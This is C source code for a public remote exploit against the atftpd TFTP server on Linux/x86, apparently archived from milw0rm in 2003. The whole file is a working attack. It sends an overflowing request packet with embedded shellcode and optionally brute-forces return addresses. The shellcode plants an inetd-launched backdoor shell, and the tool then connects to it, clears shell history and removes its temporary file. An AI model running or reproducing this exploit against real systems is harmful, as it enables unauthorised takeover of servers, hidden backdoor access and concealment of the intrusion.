/**
 ** PoC linux/86 remote exploit against atftpd (c) gunzip ( FIXED )
 **
 **
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define HEAP_START	0x080514b4
#define HEAP_END	0x080594b4

#define BACKDOOR	"rfe"	/* port MUST be > 1024 		*/
#define NOPNUM		128	/* number of nops		*/
#define PORT		69	/* tftpd port		*/
#define	BUFSIZE		512	/* size of exploit buffer 	*/
#define TIMEOUT		0x5	/* timeout in sec.		*/
#define NOALARM		0x0	/* no timeout		*/
#define	RRQ		0x1	/* request method		*/
#define MODE		"octet"	/* request mode		*/
#define OFFSET 		16000	/* distance of nops from heap	*/

struct target {
	char * name ;
	unsigned int	align ;
	unsigned int	len ;
	unsigned int	retaddr ;
} tg[] = 
	{ 
		{ "Linux (Debian 3.0)",	0,	264, 	0x0805560c 	}, 
	  	{ NULL,			0, 	0, 	0 		}
	};

char shellcode[]= /* taken from lsd-pl.net */
    "\xeb\x22"             /* jmp     <cmdshellcode+36>      */
    "\x59"                 /* popl    %ecx                   */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x66\x68""-c"         /* pushw   $0x632d                */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x50"                 /* pushl   %eax                   */
    "\x51"                 /* pushl   %ecx                   */
    "\x57"                 /* pushl   %edi                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
    "\xe8\xd9\xff\xff\xff" /* call    <cmdshellcode+2>       */
    "echo " BACKDOOR " stream tcp nowait nobody /bin/sh sh -i>/tmp/.x ;/usr/sbin/inetd /tmp/.x;"
;

void timeout( int sig )  
{
	alarm( NOALARM );
	signal( SIGALRM, SIG_DFL );
	fprintf(stderr,"[-] Timeout.\n");
	exit( EXIT_FAILURE );
} 

int shell( int fd )
{
        int rd ;
        fd_set rfds;
        static char buff[ 1024 ];
	char INIT_CMD[] = "unset HISTFILE; rm -f /tmp/.x; echo; id; uname -a\n";

        write(fd, INIT_CMD, strlen( INIT_CMD ));

        while(1) {
                FD_ZERO( &rfds );
                FD_SET(0, &rfds);
                FD_SET(fd, &rfds);

                if(select(fd+1, &rfds, NULL, NULL, NULL) < 1) {
			perror("[-] Select");
			exit( EXIT_FAILURE );
		}
                if( FD_ISSET(0, &rfds) ) {
                        if( (rd = read(0, buff, sizeof(buff))) < 1) {
				perror("[-] Read");
				exit( EXIT_FAILURE );
			}
                        if( write(fd,buff,rd) != rd) {
				perror("[-] Write");
				exit( EXIT_FAILURE );
			}
                }
                if( FD_ISSET(fd, &rfds) ) {
                        if( (rd = read(fd, buff, sizeof(buff))) < 1) {
				exit( EXIT_SUCCESS );
			}
                        write(1, buff, rd);
                }
        }
}

int try( unsigned short bport, unsigned long ip  )
{
        int                     sockfd ;
        struct sockaddr_in      sheep ;

        if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
	{
                perror("[-] Socket");
		exit( EXIT_FAILURE );
	}

        sheep.sin_family = AF_INET;
        sheep.sin_addr.s_addr = ip ;
        sheep.sin_port = htons ( bport );

        signal( SIGALRM, timeout ); 
	alarm( TIMEOUT );

        if ( connect(sockfd,(struct sockaddr *)&sheep,sizeof(sheep)) == -1 ) 
	{
		alarm( NOALARM );
		signal(SIGALRM,SIG_DFL);
                return 0;
	}

        alarm( NOALARM ); 
	signal(SIGALRM,SIG_DFL);

        return sockfd ;
}
		
char * xp_make_str( unsigned int len, unsigned int align, unsigned long retaddr )
{
	int c ;
	char * 	xp = (char *)calloc( BUFSIZE, sizeof(char) );
	char * 	code = shellcode ;

	if( !xp ) {
                fprintf(stderr, "[-] Not enough memory !\n");
                exit( EXIT_FAILURE );
        }

	/* stupid check */

	if (( align + len ) > (BUFSIZE - strlen( shellcode ) - 32)) {
		fprintf(stderr, "[-] String too long or align too high.\n");
		exit( EXIT_FAILURE );
	}
	/* 
 	 * our buffer shoud look like this
 	 *
 	 * [ NOPS ][ SHELLCODE ][ RETADDR * 4 ][ 0 ][ MODE ][ 0 ][ NOPS ][ SHELLCODE ]
 	 *                                    |_____> len
	*/
	memset ( xp, 0x41, BUFSIZE );

	memcpy( xp + len - strlen( code ) - 16, code, strlen( code )); 

	for ( c = align + len - 16 ; c < len  ; c += 4 )
		*(long *)( xp + c ) = retaddr ;

	*( xp ) = 0x0 ;
	*( xp + 1 ) = RRQ ;
	*( xp + len )= '\0' ;

	memcpy( xp + len + 1, MODE, strlen( MODE )); 

	*( xp + len + 1 + strlen( MODE )) = '\0' ;

	memcpy ( xp + BUFSIZE - strlen( code ), code, strlen( code ));

	return xp ;
} 

void usage( char * a )
{
	int o = 0 ;
	fprintf(stderr, 
		"__Usage: %s -h host -t target [options]\n\n"
		"-o\toffset\n" 
		"-a\talign\n"
		"-s\tstep for bruteforcing (try 120 <= step <= 512)\n"
		"-l\tlength of filename\n"
		"-v\ttreceives packets too (check if daemon's crashed)\n"
		"-b\tenables bruteforce (dangerous !)\n\n", a);
	while( tg[o].name != NULL )
	{
		fprintf(stderr, "\t%d - %s\n", o, tg[o].name ); o++ ;
	} 
	fprintf( stderr, "\n" );
	exit( EXIT_FAILURE );
}

int main(int argc, char *argv[])
{
	int 			sfd, t = 0, bport = 0, opt = 0, offset = 0, 
				want_receive = 0, brute = 0, yeah = 0, step = 0;
        struct 	servent 	* se ;
	unsigned long		n ;
	char * 			host ; 
        struct 	sockaddr_in 	server ;
	int 			len = sizeof(server);

        char * rbuf = (char *)calloc( BUFSIZE + 4, sizeof(char) );
        char * wbuf = (char *)calloc( BUFSIZE + 4, sizeof(char) );

        if ( !wbuf || !rbuf )  {
                fprintf(stderr, "[-] Not enough memory !\n");
                exit( EXIT_FAILURE );
        }

	memset(&server, 0, sizeof(server));

        fprintf(stderr,"\nlinux/x86 atftpd remote exploit by gunzip\n\n");

	if ( argc < 3 ) 
		usage( argv[0] );

        while ((opt = getopt(argc, argv, "bvo:a:l:h:t:s:")) != EOF) {
                switch(opt)
                {
			case 's': step = atoi( optarg ); break ;
			case 'h': host = strdup ( optarg ); break;
			case 't': t = atoi(optarg); break;
			case 'b': brute++ ; break ;
			case 'v': want_receive++ ; break ;
			case 'o': offset += atoi( optarg ); break;
			case 'a': tg[t].align = atoi( optarg ); break;
			case 'l': tg[t].len = atoi( optarg ); break;
			default: usage( argv[0] ); break;
		}
	}
        if (( se = getservbyname( BACKDOOR, NULL )) == NULL ) {
                perror("[-] Getservbyname");
		exit( EXIT_FAILURE );
	}
	if ((bport = ntohs( se->s_port )) < 1024 ) {
		fprintf(stderr, "[-] Backdoor port must be <= 1024\n");
		exit( EXIT_FAILURE );
	}
        if ( inet_aton( host , &server.sin_addr) == 0 ) {
        	struct hostent * he ;
        	
        	if ( (he = gethostbyname( host )) == NULL )  {
			perror("[-] Gethostbyname");
			exit( EXIT_FAILURE );
		}
        	server.sin_addr.s_addr =
                  	((struct in_addr *)(he->h_addr))->s_addr ;
        }
	if ((sfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1 ) {
		perror("[-] Socket");
		exit( EXIT_FAILURE );
	}
	
	fprintf(stdout,"[+] Sending request to host %s\n",
		inet_ntoa(server.sin_addr));

	if ( !step ) step = tg[t].len / 2 ; 
        if ( brute ) offset += OFFSET ;

	for( n = HEAP_START + offset; n < HEAP_END ; n += step ) {
	
		fprintf(stdout,"[+] Using len=%d align=%d retaddr=0x%.8x shellcode=%d bport=%d\n",
			tg[t].len, tg[t].align, 
			(brute ) ? (unsigned int)n : (unsigned int)tg[t].retaddr + offset, 
			strlen(shellcode), bport );

		if ( !brute )
			wbuf = xp_make_str( tg[t].len, tg[t].align, tg[t].retaddr + offset );
		else
			wbuf = xp_make_str( tg[t].len, tg[t].align, n ); 

        	server.sin_port = htons( PORT );

		if ( sendto(sfd, wbuf,
       			(size_t) BUFSIZE, 0,
        		(struct sockaddr *)&server,
                	(socklen_t)sizeof(struct sockaddr)) < tg[t].len)
		{
			perror("[-] Sendto");
		}
		else if ( want_receive )
		{	
		        signal( SIGALRM, timeout );
		        alarm( TIMEOUT );

			if ( recvfrom(sfd, rbuf, 
				(size_t) BUFSIZE, 0,
                		(struct sockaddr *)&server,
                		(socklen_t *)&len) != -1 )
			{
                        	alarm( NOALARM );
                                signal( SIGALRM, SIG_DFL);
				fprintf( stdout,"[+] Received: %.2x %.2x %.2x %.2x\n",
					rbuf[0],rbuf[1],rbuf[2],rbuf[3]);
			}
			else {
				perror("[-] Recvfrom");
			}
		}
		sleep ( 1 ) ;

		if((yeah = try( bport, server.sin_addr.s_addr ))) {
				shell( yeah );
				exit( EXIT_SUCCESS );
		}

		if ( !brute ) break ;

		memset( wbuf, 0, BUFSIZE + 4 );
		memset( rbuf, 0, BUFSIZE + 4 );
	}	

	return 1 ;
}


// milw0rm.com [2003-06-10]